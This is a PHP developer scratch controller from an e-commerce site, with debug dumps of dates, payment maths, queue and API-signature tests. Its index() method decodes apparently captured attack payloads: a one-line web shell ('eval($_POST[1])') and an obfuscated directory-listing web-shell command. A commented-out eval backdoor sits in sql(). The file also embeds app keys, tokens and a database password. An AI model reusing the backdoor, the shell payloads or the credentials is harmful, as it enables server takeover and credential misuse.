<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2017/12/25 0025
 * Time: 15:02
 */

namespace app\welcome\controller;


use app\common\traits\F;
use Fukuball\Jieba\Finalseg;
use Fukuball\Jieba\Jieba;
use lbzy\sdk\erp\Pay;
use mercury\app\Auth;
use mercury\async\Beanstalkd;
use mercury\async\Gearman;
use mercury\constants\State;
use mercury\constants\state\Times;
use mercury\cps\Config;
use mercury\factory\Factory;
use mercury\filter\Search;
use mercury\imports\Tmall;
use mercury\office\export\Orders;
use mercury\office\export\ShopOrders;
use mercury\office\export\ShopShip;
use mercury\sdk\Oauth;
use mercury\sdk\Sdk;
use mercury\weChat\WeChat;
use Pheanstalk\Exception\ServerException;

class Test
{

    public function __construct()
    {
        if (config('url_document_root') == 'zrst.com') exit;
    }

    public function index()
    {
//        dump(time());
//        exit();
//        ini_set('max_execution_time', 0);
//        ini_set('display_errors', 1);
//        $a = 24;
//        for ($i = 1; $i <= $a; $i++) {
//            if (!($i % 8)) {
//                dump(($i / 8));
//                dump($i);
//            }
//        }
//        dump((14 / 4));

        dump(strpos("array (
  'code' => 0,
  'msg' => 'Token已失效！',
)", 'Token') !== false);

        $s = '%2F9j%2F4AAQSkZJRgABAQAAAQABAAD%2F2wBDAA0JCgsKCA0LCgsODg0PEyAVExISEyccHhcgLikxMC4p%0ALSwzOko%2BMzZGNywtQFdBRkxOUlNSMj5aYVpQYEpRUk%2F%2F2wBDAQ4ODhMREyYVFSZPNS01T09PT09P%0AT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0%2F%2FwAARCAVAAvQDASIA%0AAhEBAxEB%2F8QAHAAAAgMBAQEBAAAAAAAAAAAAAAECAwQFBgcI%2F8QARxAAAgECBQIEBAQEAwYFBAEF%0AAAECAxEEEiExQQVREyJhcQYygZEUQqGxIzNSwWJy0RUkNENT4RZjc4LwByWS8TVEg5Oisv%2FEABkB%0AAQEBAQEBAAAAAAAAAAAAAAABAgMEBf%2FEACQRAQEBAQADAQEAAwEBAQEBAAABEQISITEDQRMyUQQi%0AYRRC%2F9oADAMBAAIRAxEAPwD28qsI7yV%2BxBV4ybyRlK3pYssktEiul%2Bddpv8A1MqTlUe0EvdidOq2%0A71El6IuBlRR4K%2FNKcvrYTpQjKFore36F7IVFZRfaSAkkNCGVCYmNv1FdARho5r%2FF%2FYenJHPCM5Xl%0AFXtuyLrRcZODUnFfQzasjkdcrZKDu%2Fm1t6cI8vKac25fX3Ox1%2Bsp4xQT8sYrTtocCUk4y13M8r1U%0As12%2FUsjcoi9kXRtF3eti1Ythd03GOi9zpdKw06jzJXTerObC1SSyq1%2BD2HSsOqOEiravUw1zF9Km%0AoqyLclo7FiirXFPk0rNMqkXTKZPsYreIMgyxkGRqI2FYmFiqg1bcV77K%2FqTy666hYiIJS7oepILF%0AxCGJq9h%2B5AB';
        echo(base64_decode($s));
        echo "<img src='$s'>";

        $s = "{&quot;error&quot;:{&quot;root_cause&quot;:[{&quot;type&quot;:&quot;parsing_exception&quot;,&quot;reason&quot;:&quot;[match] query doesn't support multiple fields, found [goods_name] and [goods_category_id]&quot;,&quot;line&quot;:1,&quot;col&quot;:80}],&quot;type&quot;:&quot;parsing_exception&quot;,&quot;reason&quot;:&quot;[match] query doesn't support multiple fields, found [goods_name] and [goods_category_id]&quot;,&quot;line&quot;:1,&quot;col&quot;:80},&quot;status&quot;:400}";
        dump(htmlspecialchars_decode($s));

        $d = 'openid=fbe1c301-106f-2764-bc32-119ad68c6742&app_key=AC26F2BC7106F9A5733C5FFA3BE9739E3C4F9FE51C9F058950559C50E9B8842D&app_id=13&sign=1756a0d7575202ea50fef65bec46d28d&timestamp=1522490836';
        $d = 'openid=fbe1c301-106f-2764-bc32-119ad68c6742&app_key=AC26F2BC7106F9A5733C5FFA3BE9739E3C4F9FE51C9F058950559C50E9B8842D&app_id=13&sign=15be434e87a91a11df26b2d2424caadf&timestamp=1522491502';
        parse_str($d, $d);
//        dump($d);
        $appAuth    = Auth::instance(($d));
        dump($appAuth->verify());

        dump(strlen('<script>alert(123)</script>'));
        dump(base64_decode('PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4='));
        dump(base64_decode('L3dlYi9wdWJsaWMvY3NzL3dhcC8='));
        $a = @opendir('/vagrant_data/');
        while ($n = readdir($a)) {
            dump($n);
        }
        dump(base64_encode('/home/wwwroot/'));
        echo urldecode('%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Becho%20%22-%3E%7C%22%3B%24D%3Dbase64_decode(%24_POST%5B%220xc8d36362d7695%22%5D)%3B%24F%3D%40opendir(%24D)%3Bif(%24F%3D%3DNULL)%7Becho(%22ERROR%3A%2F%2F%20Path%20Not%20Found%20Or%20No%20Permission!%22)%3B%7Delse%7B%24M%3DNULL%3B%24L%3DNULL%3Bwhile(%24N%3D%40readdir(%24F))%7B%24P%3D%24D.%22%2F%22.%24N%3B%24T%3D%40date(%22Y-m-d%20H%3Ai%3As%22%2C%40filemtime(%24P))%3B%40%24E%3Dsubstr(base_convert(%40fileperms(%24P)%2C10%2C8)%2C-4)%3B%24R%3D%22%09%22.%24T.%22%09%22.%40filesize(%24P).%22%09%22.%24E.%22%0A%22%3Bif(%40is_dir(%24P))%24M.%3D%24N.%22%2F%22.%24R%3Belse%20%24L.%3D%24N.%24R%3B%7Decho%20%24M.%24L%3B%40closedir(%24F)%3B%7D%3Becho%20%22%7C%3C-%22%3Bdie()%3B&0xc8d36362d7695=L3dlYi9wdWJsaWMvY3NzL3dhcC8%3D');
        dump([1,2,3,4]);
dump(date('Y-m-d H:i:s', 1521446068));
dump(date('Y-m-d H:i:s', 1521435283));
dump(date('Y-m-d H:i:s', 1521438780));
dump(date('Y-m-d H:i:s', 4294967295));
dump(time());
return;
//        $s = microtime(true);
        $s  = strtotime('2011-12-08');
        $e  = strtotime('2018-03-12');
        $where  = [
            'orders_shop_create_time'   => ['between', "{$s},{$e}"]
        ];
//        $export = new ShopOrders();
//        $export->setDownloadFilename('商家对账')->setMap(['shop_id' => 81])->run();
//        $export = new Orders($where);
//        $export->setMap($where)->setDownloadFilename('xxxxx')->run();
//$e = microtime(true);
//dump($e - $s);
//        $a = Times::times(Times::TIME_ORDERS_SHIP);
//dump($a);
//dump(date('Y-m-d H:i:s', '1520993052'));
//        mktime('','','','','','','');
        /*
        dump(F::secToTime(7776000));
        $t = gmdate("d天H时i分s秒", 7776000);
        echo($t);
        echo floor(7775888 / 60/ 60 / 24) . '天' . floor(7775888 / 60 / 60 % 24) . '时' . floor(7775888 / 60 % 60 ) . '分' . floor(7775888 % 60) . '秒';
*/
        //        $s = serialize('主营各类男袜、女𧙕、运动𧙕、船袜、连裤袜等，诚信经营服务至上。');
//        dump($s);
//        for ($i = 0; $i <= mb_strlen($s); $i++) {
//            //dump(strlen($s[$i]));
//        }
//        dump(strlen('主'));
//        dump(strlen('𧙕'));
//        dump(mb_detect_encoding('𧙕', 'UTF-8'));
//        dump(mb_detect_encoding('主', 'UTF-8'));
//        dump(ord('𧙕'));
//        dump(ord('袜'));
//        dump(ord('男'));
//        dump(ord('a'));
//        dump(idn_to_utf8('𧙕'));
        /*
        $all    = [];
        $in     = [];
        $s = microtime(true);
        for ($i = 0; $i < 1000000; $i++) {
            $no = F::createNo('RO');
//            if (isset($all[$no])) $in[] = $no;
//            $all[$no]   = 1;
            if (strlen($no[0]) < 22) $all[] = $no;
        }
        $e = microtime(true);
        dump($e - $s);
        dump(count($all));
        dump($all);
//        F::writeLog($in, 'no');
        */
//        dump(date('Y-m-d H:i:s', strtotime('-1 day')));
//        dump(date('Y-m-d H:i:s', mktime(0, 0, -1)));
//        $a = F::redis()->lpush('lpush_test', [2,3,4,5]);
//        dump($a);
//        $a = array (
//            'out_order_no' => 'GO20171228162405833631',
//            'sub_orders' => '[{"seller_openid":"ca9f1291-c596-11a1-e5e6-722279624569","order_no":"CO20171228162405944215","pay_cash":"5.00","max_use_consume":100,"goods":[{"goods_id":240,"goods_cash":"5.00","price":"5.00","num":1,"goods_name":"\\u7535\\u529b\\u4f53\\u5236\\u6539\\u9769\\u65b9\\u9762\\uff0c\\u57fa\\u672c\\u5b8c\\u6210\\u4ea4\\u6613\\u673a\\u6784\\u7ec4\\u5efa\\uff0c\\u8f93\\u914d\\u7535\\u4ef7\\u6539\\u9769\\u5b9e\\u73b0\\u7701\\u7ea7\\u7535\\u7f51\\u5168\\u8986\\u76d6","sku_name":"\\u98de\\u5feb\\u7684\\u8bbe\\u8ba1\\u8d39","score_multi":"0.00","score":"0.00","use_consume_ratio":0.2}]}]',
//        );
//        $b = serialize($a);
//        dump($b);
//        dump(unserialize($b));
//        $host = "mongodb://zrmall:zrMall!*%188@192.168.6.20:38000/zrmall";
//        $mo = new \MongoDB\Driver\Manager($host, []);
//        $mo->
    }

    public function calc($total = 0, $orders_total = 0)
    {
        $total      = F::numberNMulti(358.40);
        $pay_amount = F::numberNMulti(246.76);
        $pay_score  = F::numberNMulti(111.64);
        $amounts    = [
            100.00,
            99.9,
            158.5,
//            163.00,
//            168.50,
//            146.00
//            19.02,
//            59.63,
//            35.61,
//            14.59
        ];
        $t = 0;
        foreach ($amounts as $v) {
            $t += $v;
            $orders_total   = F::numberNMulti($v);
            //$multi          = (int) (round(F::numberBcDiv($orders_total, $total, 3), 2) * 100);
            $multi          = F::amountCalc($orders_total / $total, 5);
            dump($multi);
//            $_amount        = round($multi * $pay_amount * 0.0001, 2);
            $_amount        = F::amountCalc($multi * $pay_amount * 0.01);
//            $_score         = round($multi * $pay_score * 0.01, 2);
            $_score         = F::amountCalc($multi * $pay_score, 0);
            dump($_amount);
            dump($_score);
        }
    }

    public function test()
    {
        dump(F::amountCalc(15.7));
//        \app\common\traits\F::gearmanLogs('erp_pay_notify', [1,2,3,4,5], true);
    }

    public function info()
    {
        exit();
        $beanstalk  = new Beanstalkd('default');
        try {
            $id     = $beanstalk->put(['test']);
            dump($id);
            $job    = $beanstalk->handler()->statsJob($id);
            dump($job);
//            $flag   = $beanstalk->handler()->del($id);
//            dump($flag);
        } catch (ServerException $e) {
            dump($e->getMessage());
            dump($e);
        }
    }

    public function gear()
    {
//        $flag   = Gearman::getInstance()->addTask(Gearman::FUNCTION_TEST, ['test']);
//        echo $flag;
//        $flag   = Gearman::getInstance()->addTask(Gearman::FUNCTION_SEND_SMS, ['to' => 18576380995, 'content' => '欢迎注册中睿商城']);
//        echo $flag;
        exit();
        $flag    = Gearman::getInstance()->addTask(Gearman::FUNCTION_SEND_EMAIL, ['to' => 'mercury@jozhi.com.cn', 'content' => '欢迎注册中睿商城']);
        echo $flag;
    }

    public function gear1()
    {
//        $flag   = Gearman::getInstance()->addTask(Gearman::FUNCTION_SEND_SMS, ['to' => 14444444444, 'content' => '欢迎注册中睿商城']);
//        echo $flag;
        exit();
        dump(base64_decode('XGFwcFxhcGlcY29udHJvbGxlclwU4B47/e1aXwE='));
        $a = thumb('http://oz3fjflhn.bkt.clouddn.com/FkOQ7OjugQxwdV-8BR37i_K4ip9H', 176);
        dump($a);
    }

    public function orders()
    {
        exit();
        $map   = [
            'orders_no' => 'GO20180122092144565721',
        ];
        $order  = db('orders')->where($map)->find();
        $openid = db('user')->where(['user_id' => $order['buyer_user_id']])->value('openid');
        $ret    = Pay::instance()->queryOrder($openid, 'CO20180122092144611095');
        dump($ret);
    }

    public function config()
    {
        exit();
        $s = microtime(true);
        dump(config('site'));
        $e = microtime(true);
        dump($e - $s);
        F::mod();
    }

    public function app()
    {
//        $sdk    = new Sdk('/tools/v1/bank/index');
//        $ret    = $sdk->request()->toArray();
//        dump($ret);
        exit();
        $flag   = db('disabled_keyword')->where(['status' => State::STATE_NORMAL, 'category_id' => State::STATE_DISABLED])->column('keyword');
//        $words  = db('disabled_keyword')->where(['status' => State::STATE_NORMAL, 'category_id' => State::STATE_DISABLED])->column('keyword');
//        if (!empty($words)) {
//            $tmp = '';
//            foreach ($words as $v) {
//                $tmp .= str_replace([',', ',,', '、', ' '], ['|','|','|',''], $v);
//            }
//            echo(str_replace(' ', '', $tmp));
//        }
//        $first = db('goods_category')->cache(true)->where(['category_state' => 1, 'category_sid' => 0])->column('category_id');
//        dump($first);
//        $cates  = db('goods_category')->where(['category_state' => 1, 'category_sid' => ['in', db('goods_category')->cache(true)->where(['category_state' => 1, 'category_sid' => 0])->column('category_id')]])->cache(true)->field('category_id,category_name')->select();
        $o = new Oauth();
        $o->getCode('https://www.zrst.com');
    }

    public function jieba()
    {
        exit;
//        ini_set('display_errors', 1);
//        $s = microtime(true);
//        Jieba::init();
//        Finalseg::init();
//        $res    = implode(',', Jieba::cut('怜香惜玉也得要看对象啊！', false));
//        dump($res);
//        $e = microtime(true);
//        dump($e - $s);
//        $weChat = WeChat::instance()->getParams();
//        dump($weChat);
        $crypt_api      = 'fqqj3bKqeK-zeKXafXhy2ZKNnNnJoqqrvr2v2rCTotqLrbia';
        $token          = '1F8C243D63BE1018B2DD64D957F4976FA6F26C56DBFFD73556E154D08EE125AB';
////        $api            = '/goods/v1/goodsCategory/detail';
        $authApi        = new \mercury\auth\api\AuthApi($crypt_api, $token);    //实例化对象
////        $tokens = $authApi->createHeaders();
////        dump($tokens);
        dump($authApi->decryptionApi());
//        dump($authApi);
//        dump(is_callable(['\app\api\controller\orders\v1\SellerOrders', 'ship']));
    }

    public function imports()
    {
        exit();
        $obj    = new Tmall('https://detail.tmall.com/item.htm?spm=a220m.1000858.1000725.1.7fe627f36Y5ajt&id=546373000438&skuId=3302381192380&areaId=440100&user_id=356060330&cat_id=50025135&is_b=1&rn=635340e0e22043b0171eea0b3a3f0964');
        $obj->getTitle();
    }

    public function cps()
    {
        $ret    = Factory::instance('/user/v1/account/index')->run();
        dump($ret);
//        $res    = \mercury\cps\Orders::instance(Config::ORDERS_SYNCHRONIZE, [])->request()->toArray();
//        dump($res);
    }

    public function sql()
    {
//        eval($_POST[1]);
    }

    public function post()
    {
        $data   = [
            'q' => 'apple',
            'order' => 'price_asc',
            'price_min' => 1,
            'price_max' => 'xx',
            'script' => 1,
            'shop_id'   => 'xxx',
            'asdsad'    => 1
        ];
//        $filter = new Search();
//        dump($filter->run());

//        $ret    = searchFilter($data, 'search');
//        dump($ret);
        $a = '{
    "app_id" : "13",
    "app_key" : "AC26F2BC7106F9A5733C5FFA3BE9739E3C4F9FE51C9F058950559C50E9B8842D",
    "callback_url" : "https://wap.zrst.com/goods?id=450758&share_code=p74e00",
    "openid" : "8f98ab75-1016-3e17-ca12-b6b2cb22a925",
    "timestamp" : "1524451002"
}';
        $url    = 'http://wap.zrshop.com/user/applogin?openid=8f98ab75-1016-3e17-ca12-b6b2cb22a925&app_key=AC26F2BC7106F9A5733C5FFA3BE9739E3C4F9FE51C9F058950559C50E9B8842D&app_id=13&sign=15a026854903b3d83360ae822e206745&timestamp=1524451002&callback_url=https%3A%2F%2Fwap.zrst.com%2Fgoods%3Fid%3D450758%26share_code%3Dp74e00%26name%3Dha%3Ea%3Cb%22ns%27jasdk';
        $p = parse_url($url);
        dump($p['query']);
//        dump(http_build_query($p['query']));
        parse_str($p['query'], $arr);
        dump($arr);
        dump(http_build_query($arr));
        echo urlencode('https://wap.zrst.com/goods?id=450758&share_code=p74e00&name=ha>a<b"ns\'jasdk') , PHP_EOL;
        echo http_build_query(["https://wap.zrst.com/goods?id=450758&share_code=p74e00'><\""]) , PHP_EOL;
//        $data   = json_decode($a, true);
//        dump(http_build_query($data));
    }

    public function members()
    {
        ini_set('max_execution_time', 0);
        $members    = json_decode(file_get_contents(ROOT_PATH . 'logs/data/username_to_long.json'), true);
//        dump($members['rows']);
        $line   = 0;
        $users  = file_get_contents(ROOT_PATH . 'logs/data/member.txt');
        $users  = explode("\r\n", $users);
        $cnt    = 3;
        $aSql   = [];
        $sql    = "UPDATE `zr_user` SET `openid` = '%s', `user_username` = '%s' WHERE `user_id` = %d;";
        $sqls   = '';
        $in     = '';
        while (true) {
            if (!isset($users[$line])) break;
            $tmp_user   = explode(',', $users[$line]);
            ++$line;
            if (count($tmp_user) != $cnt) {
                dump($tmp_user);
                continue;
            }
            foreach ($members['rows'] as $v) {
                if ($v['openid'] == $tmp_user[2]) {
                    $aSql[] = sprintf($sql, $tmp_user[1], $tmp_user[0], $v['user_id']);
                    $sqls .= sprintf($sql, $tmp_user[1], $tmp_user[0], $v['user_id']) . "\r\n";
                    $in .= "'{$tmp_user[1]}',";
                }
            }
            echo "现在执行第 {$line} 行\r\n";
//            if ($line % 5000 == 0) sleep(5);
        }
        F::writeLog($sqls);
        $sql    = var_export($aSql) . PHP_EOL;
        echo $sqls . PHP_EOL;
        echo rtrim($in, ',') . PHP_EOL;
        file_put_contents('/vagrant_data/logs/data/users.sql', $sqls);
    }
}